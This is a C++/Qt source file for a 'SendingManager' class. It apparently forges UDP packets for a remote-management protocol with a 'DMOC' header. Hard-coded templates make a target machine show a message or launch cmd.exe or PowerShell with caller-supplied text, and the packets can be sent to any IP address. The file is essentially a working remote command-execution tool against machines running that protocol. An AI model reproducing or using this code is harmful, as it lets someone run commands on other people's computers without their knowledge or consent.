//
// Created by superhuap on 2025/7/31.
//

#include "SendingManager.h"
#include <random>
#include "SettingManager.h"

SendingManager *SendingManager::m_instance = nullptr;

// -------------- 预置报文模板 --------------
const std::array<QByteArray, 5> SendingManager::m_base = {
    // 0 msg
    QByteArrayLiteral(
        "\x44\x4d\x4f\x43\x00\x00\x01\x00\x9e\x03\x00\x00\x10\x41\xaf\xfb"
        "\xa0\xe7\x52\x40\x91\xdc\x27\xa3\xb6\xf9\x29\x2e\x20\x4e\x00\x00"
        "\xc0\xa8\x50\x81\x91\x03\x00\x00\x91\x03\x00\x00\x00\x08\x00\x00"
        "\x00\x00\x00\x00\x05\x00\x00\x00") +
        QByteArray(744 - 56, '\x00'),

    // 1 cmd
    QByteArrayLiteral(
        "\x44\x4d\x4f\x43\x00\x00\x01\x00\x6e\x03\x00\x00\x5b\x68\x2b\x25"
        "\x6f\x61\x64\x4d\xa7\x92\xf0\x47\x00\xc5\xa4\x0e\x20\x4e\x00\x00"
        "\xc0\xa8\x64\x86\x61\x03\x00\x00\x61\x03\x00\x00\x00\x02\x00\x00"
        "\x00\x00\x00\x00\x0f\x00\x00\x00\x01\x00\x00\x00\x43\x00\x3a\x00"
        "\x5c\x00\x57\x00\x69\x00\x6e\x00\x64\x00\x6f\x00\x77\x00\x73\x00"
        "\x5c\x00\x73\x00\x79\x00\x73\x00\x74\x00\x65\x00\x6d\x00\x33\x00"
        "\x32\x00\x5c\x00\x63\x00\x6d\x00\x64\x00\x2e\x00\x65\x00\x78\x00"
        "\x65\x00\x00\x00") +
        QByteArray(744 - 120, '\x00'),

    // 2 powershell
    QByteArrayLiteral(
        "\x44\x4d\x4f\x43\x00\x00\x01\x00\x6e\x03\x00\x00\x5b\x68\x2b\x25"
        "\x6f\x61\x64\x4d\xa7\x92\xf0\x47\x00\xc5\xa4\x0e\x20\x4e\x00\x00"
        "\xc0\xa8\x64\x86\x61\x03\x00\x00\x61\x03\x00\x00\x00\x02\x00\x00"
        "\x00\x00\x00\x00\x0f\x00\x00\x00\x01\x00\x00\x00\x43\x00\x3a\x00"
        "\x5c\x00\x57\x00\x69\x00\x6e\x00\x64\x00\x6f\x00\x77\x00\x73\x00"
        "\x5c\x00\x57\x00\x69\x00\x6e\x00\x64\x00\x6f\x00\x77\x00\x73\x00"
        "\x50\x00\x6f\x00\x77\x00\x65\x00\x72\x00\x53\x00\x68\x00\x65\x00"
        "\x6c\x00\x6c\x00\x5c\x00\x76\x00\x31\x00\x2e\x00\x30\x00\x5c\x00"
        "\x70\x00\x6f\x00\x77\x00\x65\x00\x72\x00\x73\x00\x68\x00\x65\x00"
        "\x6c\x00\x6c\x00\x2e\x00\x65\x00\x78\x00\x65\x00\x00\x00") +
        QByteArray(744 - 180, '\x00')
};

SendingManager *SendingManager::instance()
{
    if (!m_instance)
        m_instance = new SendingManager();
    return m_instance;
}

SendingManager::SendingManager(QObject *parent)
    : QObject(parent)
{
}

// 把 QString → “Little-Endian UTF-16” 字节流
QByteArray SendingManager::formatToBytes(const QString &text) const
{
    const QString tmp = text;
    const ushort *data = tmp.utf16();
    QByteArray out;
    out.reserve(tmp.size() * 2);
    for (int i = 0; data[i]; ++i) {
        ushort ch = data[i];
        out.append(static_cast<char>(ch & 0xFF));
        out.append(static_cast<char>(ch >> 8));
    }
    return out;
}

QByteArray SendingManager::packMessage(const QString &type,
                                       const QString &content) const
{
    QByteArray result;
    int index = 0;
    if (type == QLatin1String("msg")) {
        result = m_base[0];
        index  = 56;
    } else if (type == QLatin1String("cmd")) {
        result = m_base[1];
        index  = 578;
    } else if (type == QLatin1String("powershell")) {
        result = m_base[2];
        index  = 578;
    } else {
        return {};
    }

    QByteArray payload = formatToBytes(content);

    /* 填入 payload */
    int len = qMin(payload.size(), result.size() - index);
    memcpy(result.data() + index, payload.constData(), len);

    /* 随机填充 15-19 字节 */
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<int> dis(0, 255);
    for (int i = 15; i < 20; ++i)
        result[i] = static_cast<char>(dis(gen));

    return result;
}

void SendingManager::send(const QString &type,
                          const QString &content,
                          const QString &ip)
{
    QByteArray datagram = packMessage(type, content);
    if (datagram.isEmpty())
        return;

    QUdpSocket socket;
    socket.writeDatagram(datagram, QHostAddress(ip), SettingsManager::instance()->getValue("port").toUInt());
}